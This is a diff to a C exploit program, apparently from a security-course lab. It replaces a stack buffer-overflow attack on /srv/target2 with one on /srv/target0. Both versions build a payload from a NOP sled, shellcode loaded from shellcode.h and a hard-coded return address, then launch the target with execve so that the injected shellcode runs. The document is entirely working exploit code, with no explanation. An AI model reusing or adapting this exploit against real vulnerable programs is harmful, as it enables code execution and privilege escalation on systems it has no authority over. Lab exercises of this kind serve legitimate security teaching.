@@ -5,39 +5,31 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target2"
+#define TARGET "/srv/target0"
 
-#define BUFFER_SIZE 409
-#define OFFSET 201
-#define RETURN_ADDRESS 0xffffdb5c
+const int PAYLOAD_SIZE = 408;
+const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
+const uint32_t RETURN_ADDR = 0xffffdb2c;
 
-void fill_buffer(char *buf) {
-    memset(buf, 0x90, BUFFER_SIZE - 1);
-    memcpy(buf + OFFSET, shellcode, sizeof(shellcode) - 1);
-    
-    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buf + i) = RETURN_ADDRESS;
-    }
-    
-    buf[BUFFER_SIZE - 1] = '\0';
-}
-
-int main(void) {
-    char *args[4];
+int main(void)
+{
+    char *args[3];
     char *env[1];
-    char buf[BUFFER_SIZE];
-    
-    fill_buffer(buf);
-    
+
+    char payload[PAYLOAD_SIZE + 1];
+    memset(payload, 0x90, PAYLOAD_SIZE);
+    payload[PAYLOAD_SIZE] = '\0';
+    memcpy(payload, shellcode, SHELLCODE_SIZE);
+    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDR;
+
     args[0] = TARGET;
-    args[1] = buf;
-    args[2] = "65935";
-    args[3] = NULL;
-    
+    args[1] = payload;
+    args[2] = NULL;
+
     env[0] = NULL;
-    
+
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
-    
+
     return 0;
 }
